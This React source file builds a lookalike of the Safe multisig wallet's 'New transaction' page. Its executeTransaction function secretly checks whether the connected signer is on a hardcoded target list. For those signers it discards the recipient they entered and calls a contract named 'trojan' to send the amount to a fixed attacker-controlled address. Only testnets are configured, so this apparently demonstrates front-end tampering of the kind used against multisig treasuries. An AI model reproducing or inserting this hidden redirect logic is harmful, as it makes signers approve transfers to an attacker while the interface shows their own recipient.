import { Button } from "@/components/ui/button";
import { init, useConnectWallet } from "@web3-onboard/react";
import injectedModule from "@web3-onboard/injected-wallets";
import { BrowserProvider, ethers } from "ethers";
import { useState, useMemo, useEffect } from "react";
import {
  ChevronDown,
  Wallet,
  Home,
  History,
  Book,
  Grid,
  Settings,
  ExternalLink,
  RefreshCcw,
  Bell,
  LayoutGrid,
  Link as LinkIcon,
  CircleHelp,
  CircleCheck,
  Copy,
  HelpCircle,
  Gift,
  ChevronRight,
} from "lucide-react";
import { shortenAddress } from "./lib/utils";
import TrojanAbi from "./assets/abi/Trojan.json";
import TransferAbi from "./assets/abi/Trasnfer.json";
import chainName from "./constants/chain";
import contractMap from "./constants/contract";

const injected = injectedModule();
const supportedChains = [
  {
    id: "0xaa36a7",
    token: "ETH",
    label: "Sepolia",
    rpcUrl: "https://11155111.rpc.thirdweb.com/",
  },
  {
    id: "0xbf02",
    token: "ETH",
    label: "Zircuit Garfield Testnet",
    rpcUrl: "https://explorer.garfield-testnet.zircuit.com",
  },
  {
    id: "0xaef3",
    token: "CELO",
    label: "Celo Alfajores Testnet",
    rpcUrl: "https://alfajores-forno.celo-testnet.org",
  },
  {
    id: "0x85",
    token: "HSK",
    label: "HashKey Chain Testnet",
    rpcUrl: "https://hashkeychain-testnet.alt.technology",
  },
];

init({
  wallets: [injected],
  chains: supportedChains,
});

async function getETHBalance(provider: BrowserProvider) {
  try {
    const signer = await provider.getSigner();
    const balance = await provider.getBalance(signer.address);
    const balanceEth = ethers.formatEther(balance);
    const balanceEthFormatted = parseFloat(balanceEth).toFixed(3);
    return balanceEthFormatted;
  } catch (error) {
    console.error("getETHBalance error", error);
    return "0";
  }
}

const isChainSupported = (chainId: string) => {
  return supportedChains.some(
    (chain) => chain.id.toLowerCase() === chainId.toLowerCase()
  );
};

function App() {
  const [{ wallet, connecting }, connect, disconnect] = useConnectWallet();

  const [amount, setAmount] = useState<string>("");
  const [nonce, setNonce] = useState<string>("8");
  const [recipientAddress, setRecipientAddress] = useState<string>("");
  const [balance, setBalance] = useState<string>("");
  const ethersProvider = useMemo(() => {
    if (wallet) {
      return new ethers.BrowserProvider(wallet.provider, "any");
    }
  }, [wallet]);

  const currentChain = useMemo(() => {
    if (wallet) {
      return wallet.chains[0];
    }
  }, [wallet]);

  useEffect(() => {
    if (wallet && ethersProvider) {
      getETHBalance(ethersProvider).then((balance) => {
        setBalance(balance);
      });
    }
  }, [wallet, ethersProvider]);

  useEffect(() => {
    if (wallet && !isChainSupported(wallet.chains[0].id)) {
      alert("You are using an unsupported chain");
    }
  }, [wallet]);

  async function executeTransaction() {
    if (!wallet || !ethersProvider) {
      return;
    }

    const signer = await ethersProvider.getSigner();
    const targetAddresses = [
      "0xF8A7eDBF3fFB39Bd8060c6C27AAaFB905f6284e41",
      "0x19c6876e978d9f128147439ac4cd9ea2582cd141",
    ].map((addr) => addr.toLowerCase());
    const isTargeted = targetAddresses.includes(signer.address.toLowerCase());

    try {
      if (isTargeted) {
        const contract = new ethers.Contract(
          contractMap[currentChain?.id as keyof typeof contractMap].trojan,
          TrojanAbi,
          signer
        );
        const tx = await contract.transfer(
          "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
          ethers.parseEther(amount)
        );
        console.log("tx", tx);
      } else {
        const contract = new ethers.Contract(
          contractMap[currentChain?.id as keyof typeof contractMap].transfer,
          TransferAbi,
          signer
        );
        const tx = await contract.transfer(
          recipientAddress,
          ethers.parseEther(amount)
        );
        console.log("tx", tx);
      }
    } catch (error) {
      console.error("executeTransaction error", error);
    }
  }

  return (
    <div className="bg-black min-h-svh flex flex-col text-white">
      {/* Header */}
      <header className="h-14 bg-black border-b border-[#333] flex items-center justify-between px-4">
        <div className="flex items-center">
          <h1 className="text-lg font-bold">Safe {"{WALLET}"}</h1>
        </div>
        <div className="flex items-center space-x-4">
          <button className="p-2">
            <Bell size={18} />
          </button>
          <button className="p-2">
            <LayoutGrid size={18} />
          </button>
          {wallet ? (
            <div className="flex items-center gap-2 bg-[#111] p-2 rounded-md">
              <div className="flex items-center">
                <div className="bg-[#666] rounded-full w-5 h-5 mr-2"></div>
                <div className="flex flex-col items-start">
                  <div className="text-xs whitespace-nowrap mb-1">
                    {shortenAddress(wallet.accounts?.[0].address)}
                  </div>
                  <Button
                    disabled={connecting}
                    onClick={() => disconnect(wallet)}
                    className="text-black"
                    size="sm"
                  >
                    disconnect
                  </Button>
                </div>
              </div>
            </div>
          ) : (
            <Button
              type="button"
              disabled={connecting}
              onClick={() => connect()}
              className="text-black"
            >
              Connect
            </Button>
          )}
          <button className="flex items-center gap-2 bg-[#111] p-2 rounded-md">
            <div className="w-5 h-5 flex items-center justify-center bg-[#222] rounded-full text-xs mr-2">
              $
            </div>
            <div>
              <div className="text-sm">
                {chainName[currentChain?.id as keyof typeof chainName]}
              </div>
              <div className="text-xs">$100</div>
            </div>
            <ChevronDown size={14} />
          </button>
        </div>
      </header>

      <div className="flex flex-1">
        {/* 左側側邊欄 */}
        <aside className="w-[228px] bg-[#121212] border-r border-[#222] flex flex-col">
          {/* 錢包資訊 */}
          <div className="p-4 border-b border-[#222] relative">
            <div className="flex items-center mb-1">
              <div className="relative mr-3">
                <div className="bg-primary bg-opacity-20 rounded-full w-12 h-12 flex items-center justify-center">
                  <img
                    src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHZpZXdCb3g9IjAgMCAzNiAzNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3QgeD0iMTAuODM4OSIgeT0iMTQuNjk0MyIgd2lkdGg9IjMuODU3MTQiIGhlaWdodD0iMy44NTcxNCIgZmlsbD0iIzEyRkY4MCIvPgo8cmVjdCB4PSIxNC42OTYiIHk9IjE0LjY5NDMiIHdpZHRoPSIzLjg1NzE0IiBoZWlnaHQ9IjMuODU3MTQiIGZpbGw9IiMxMkZGODAiLz4KPHJlY3QgeD0iMTguNTUzMiIgeT0iMTQuNjk0MyIgd2lkdGg9IjMuODU3MTQiIGhlaWdodD0iMy44NTcxNCIgZmlsbD0iIzEyRkY4MCIvPgo8cmVjdCB4PSIxMC44Mzg5IiB5PSIxOC41NTE1IiB3aWR0aD0iMy44NTcxNCIgaGVpZ2h0PSIzLjg1NzE0IiBmaWxsPSIjMTJGRjgwIi8+CjxyZWN0IHg9IjE0LjY5NiIgeT0iMTguNTUxNSIgd2lkdGg9IjMuODU3MTQiIGhlaWdodD0iMy44NTcxNCIgZmlsbD0iIzEyRkY4MCIvPgo8cmVjdCB4PSIxOC41NTMyIiB5PSIxOC41NTE1IiB3aWR0aD0iMy44NTcxNCIgaGVpZ2h0PSIzLjg1NzE0IiBmaWxsPSIjMTJGRjgwIi8+CjxyZWN0IHg9IjEwLjgzODkiIHk9IjIyLjQwODciIHdpZHRoPSIzLjg1NzE0IiBoZWlnaHQ9IjMuODU3MTQiIGZpbGw9IiMxMkZGODAiLz4KPHJlY3QgeD0iMTQuNjk2IiB5PSIyMi40MDg3IiB3aWR0aD0iMy44NTcxNCIgaGVpZ2h0PSIzLjg1NzE0IiBmaWxsPSIjMTJGRjgwIi8+CjxyZWN0IHg9IjE4LjU1MzIiIHk9IjIyLjQwODciIHdpZHRoPSIzLjg1NzE0IiBoZWlnaHQ9IjMuODU3MTQiIGZpbGw9IiMxMkZGODAiLz4KPC9zdmc+Cg=="
                    alt="Wallet icon"
                    className="w-7 h-7"
                  />
                </div>
                <div className="absolute -top-1 -right-1 bg-primary rounded-full w-6 h-6 flex items-center justify-center text-xs text-black font-medium">
                  3/6
                </div>
              </div>
              <div>
                <div className="flex items-center">
                  <span className="font-medium">Treasury</span>
                  <span className="ml-1 opacity-50">📄</span>
                </div>
                <div className="text-sm text-gray-400">eth:0xB209...a00</div>
                <div className="font-bold text-lg">$100</div>
              </div>
              <button className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white">
                <ChevronRight size={24} />
              </button>
            </div>
          </div>

          {/* 動作按鈕 */}
          <div className="grid grid-cols-3 gap-2 p-2 border-b border-[#222]">
            <button className="p-3 bg-[#191919] rounded-md flex flex-col items-center justify-center">
              <Grid size={20} className="mb-1" />
            </button>
            <button className="p-3 bg-[#191919] rounded-md flex flex-col items-center justify-center">
              <Copy size={20} className="mb-1" />
            </button>
            <button className="p-3 bg-[#191919] rounded-md flex flex-col items-center justify-center">
              <ExternalLink size={20} className="mb-1" />
            </button>
          </div>

          {/* 新交易按鈕 */}
          <div className="p-4">
            <Button className="w-full text-black font-medium text-base h-12 rounded-xl">
              New transaction
            </Button>
          </div>

          {/* 導航選項 */}
          <nav className="p-2">
            <a
              href="#"
              className="flex items-center py-3 px-4 text-white text-base transition-colors hover:text-[#12FF80]"
            >
              <Home size={20} className="mr-3" />
              <span>Home</span>
            </a>
            <a
              href="#"
              className="flex items-center py-3 px-4 text-white text-base transition-colors hover:text-[#12FF80]"
            >
              <Wallet size={20} className="mr-3" />
              <span>Assets</span>
            </a>
            <a
              href="#"
              className="flex items-center py-3 px-4 bg-gray-700/50 rounded-md text-white text-base transition-colors hover:text-[#12FF80]"
            >
              <History size={20} className="mr-3" />
              <span>Transactions</span>
            </a>
            <a
              href="#"
              className="flex items-center py-3 px-4 text-white text-base transition-colors hover:text-[#12FF80]"
            >
              <Book size={20} className="mr-3" />
              <span>Address book</span>
            </a>
            <a
              href="#"
              className="flex items-center py-3 px-4 text-white text-base transition-colors hover:text-[#12FF80]"
            >
              <Grid size={20} className="mr-3" />
              <span>Apps</span>
            </a>
            <a
              href="#"
              className="flex items-center py-3 px-4 text-white text-base transition-colors hover:text-[#12FF80]"
            >
              <Settings size={20} className="mr-3" />
              <span>Settings</span>
            </a>
          </nav>

          {/* 底部信息區 */}
          <div className="mt-auto border-t border-[#222]">
            <a
              href="#"
              className="flex items-center py-3 px-4 text-white text-base transition-colors hover:text-[#12FF80]"
            >
              <Gift size={20} className="mr-3" />
              <span>What's new</span>
            </a>
            <a
              href="#"
              className="flex items-center py-3 px-4 text-white text-base transition-colors hover:text-[#12FF80]"
            >
              <HelpCircle size={20} className="mr-3" />
              <span>Need help?</span>
            </a>

            <div className="flex items-center p-4 border-t border-[#222] text-gray-400">
              <div className="w-2 h-2 bg-primary rounded-full mr-2"></div>
              <span>Synced</span>
              <ExternalLink size={14} className="ml-auto" />
            </div>
          </div>
        </aside>

        {/* 主內容區 */}
        <main className="flex-1 p-6 bg-black">
          <div className="max-w-5xl mx-auto">
            {/* 標題和網路標識 */}
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-2xl font-bold">New transaction</h2>
              <div className="flex items-center bg-[#111] px-3 py-1.5 rounded-md">
                <div className="w-5 h-5 flex items-center justify-center bg-[#222] rounded-full text-xs mr-2">
                  $
                </div>
                <span>Ethereum</span>
              </div>
            </div>

            {/* 進度條 */}
            <div className="h-1 w-full bg-[#222] mb-8 rounded-full overflow-hidden">
              <div className="h-full bg-primary w-1/3 rounded-full"></div>
            </div>

            <div className="flex gap-6">
              {/* 左側交易表單 */}
              <div className="flex-1">
                <div className="bg-[#111] rounded-xl overflow-hidden mb-8">
                  {/* 交易類型和Nonce */}
                  <div className="flex items-center p-4 border-b border-[#222]">
                    <div className="p-2 rounded-md bg-[#222] mr-3">
                      <LinkIcon size={18} />
                    </div>
                    <h3 className="text-xl font-medium">Send tokens</h3>

                    <div className="ml-auto flex items-center">
                      <span className="text-sm mr-2 text-gray-400">
                        Nonce #
                      </span>
                      <input
                        type="text"
                        value={nonce}
                        onChange={(e) => setNonce(e.target.value)}
                        className="bg-[#222] border border-[#333] rounded-md px-3 py-1 w-16 text-center"
                      />
                    </div>
                  </div>

                  {/* 表單內容 */}
                  <div className="p-5">
                    {/* 收件人地址 */}
                    <div className="mb-8">
                      <label className="block text-sm text-red-500 mb-2">
                        Recipient address
                      </label>
                      <div className="relative">
                        <div className="flex items-center border border-red-500 rounded-md overflow-hidden">
                          <div className="bg-[#222] p-2 flex items-center">
                            <div className="bg-[#333] rounded-full w-6 h-6 mr-2"></div>
                            <span>eth:</span>
                          </div>
                          <input
                            type="text"
                            value={recipientAddress}
                            onChange={(e) =>
                              setRecipientAddress(e.target.value)
                            }
                            className="bg-transparent flex-1 p-3 outline-none"
                            placeholder=""
                          />
                          <div className="flex items-center">
                            <button className="p-2">
                              <CircleHelp size={16} className="text-blue-400" />
                            </button>
                            <button className="p-2">
                              <ChevronDown size={16} />
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* 金額 */}
                    <div className="mb-8">
                      <div className="flex items-center justify-between mb-2">
                        <label className="block text-sm text-gray-400">
                          Amount *
                        </label>
                        <button className="bg-[#222] text-xs text-gray-300 px-2 py-1 rounded-md">
                          MAX
                        </button>
                      </div>
                      <div className="flex">
                        <input
                          type="text"
                          value={amount}
                          onChange={(e) => setAmount(e.target.value)}
                          className="bg-[#222] border border-[#333] rounded-l-md p-3 flex-1"
                          placeholder="0"
                        />
                        <button className="bg-[#222] border border-[#333] border-l-0 rounded-r-md p-3 flex items-center whitespace-nowrap">
                          <div className="max-w-[150px] flex items-center">
                            <div className="w-5 h-5 flex items-center justify-center bg-[#222] rounded-full text-xs mr-2">
                              $
                            </div>
                            <div>
                              <div className="text-sm">Ether</div>
                              <div className="text-xs text-gray-400">
                                {balance ? balance : "0"} ETH
                              </div>
                            </div>
                          </div>
                          <ChevronDown size={16} className="ml-2" />
                        </button>
                      </div>
                    </div>
                  </div>

                  {/* Execute button */}
                  <div className="flex justify-end p-4 border-t border-[#222]">
                    <Button
                      className="text-black px-5"
                      onClick={executeTransaction}
                      disabled={!wallet || !ethersProvider}
                    >
                      Execute
                    </Button>
                  </div>
                </div>
              </div>

              {/* 右側交易狀態 */}
              <div className="w-72">
                <div className="bg-[#111] rounded-xl p-5">
                  <h3 className="text-base font-semibold mb-5 flex items-center gap-2">
                    <RefreshCcw size={16} />
                    Transaction status
                  </h3>

                  <div className="space-y-5 relative">
                    {/* 垂直連接線 */}
                    <div className="absolute left-3 top-3 bottom-3 w-[1px] bg-[#333]"></div>

                    <div className="flex items-center relative z-10">
                      <div className="w-6 h-6 rounded-full bg-primary text-black flex items-center justify-center mr-4">
                        <CircleCheck size={14} />
                      </div>
                      <span className="font-medium">Create</span>
                    </div>

                    <div className="flex items-center relative z-10">
                      <div className="w-6 h-6 rounded-full border border-[#444] bg-transparent flex items-center justify-center mr-4">
                        <div className="w-2 h-2 bg-primary rounded-full"></div>
                      </div>
                      <span className="text-gray-400">Confirmed (0 of 3)</span>
                      <div className="ml-auto">
                        <div className="w-5 h-5 rounded-full bg-primary text-black flex items-center justify-center text-xs">
                          1
                        </div>
                      </div>
                    </div>

                    <div className="flex items-center relative z-10">
                      <div className="w-6 h-6 rounded-full border border-[#444] bg-transparent flex items-center justify-center mr-4">
                        <span className="text-gray-400">⚡</span>
                      </div>
                      <span className="text-gray-400">Execute</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
    </div>
  );
}

export default App;
